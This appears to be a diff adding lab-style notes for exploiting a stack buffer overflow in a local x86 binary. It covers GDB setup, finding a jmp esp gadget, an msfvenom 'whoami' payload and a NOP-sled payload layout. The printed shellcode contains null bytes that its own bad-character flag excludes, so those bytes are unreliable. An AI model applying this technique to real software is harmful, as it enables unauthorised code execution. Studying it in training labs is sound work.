@@ -306,6 +306,49 @@ Buffer Overflow Defenses
 ## change offset = "A" * 100 in script to the offset value
 ## add eip ="BBB" and print (offset+eip) to script, run it to confirm eip is "BBB"                                                      eip = "BBB"
 
+## Set GDB environment and find jmp esp addresses
+  >shell
+  >env -gdb ./func
+    show env
+    unset env COLUMNS
+    unset env LINES
+    file func
+    run and ctrl+c or start
+    info proc map
+## grab first address after heap, last address before stack   start address 0xf7de1000     end address 0xf7ffe000
+    find /b 0xf7de1000, 0xf7ffe000, 0xff, 0xe4 
+##copy the first 4, and convert them to little endian 
+        0xf7de3b59 > \x59\x3b\xde\xf7                                      
+## put into   ->                                                                                                                  eip = "\x59\x3b\xde\xf7"
+shell                                                                                                                             nop = "\x90" * 15
+>msfvenom -p linux/x86/exec CMD=whoami -b "\x00\xfe\x20\x0a\xff" -f python
+## take al buf and put into script under nop                                                                                      buf =  b""
+                                                                                                                                  buf += b"\x6a\x0b\x58\x99\x52\x66\x68\x2d\x63\x89\xe7\x68"
+                                                                                                                                  buf += b"\x2f\x73\x68\x00\x68\x2f\x62\x69\x6e\x89\xe3\x52"
+                                                                                                                                  buf += b"\xe8\x07\x00\x00\x00\x77\x68\x6f\x61\x6d\x69\x00"
+>run <<<$(python linex.py)                                                                                                        buf += b"\x57\x53\x89\xe1\xcd\x80"
+                                                                                                                                  print (offset+eip+nop+buf)
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
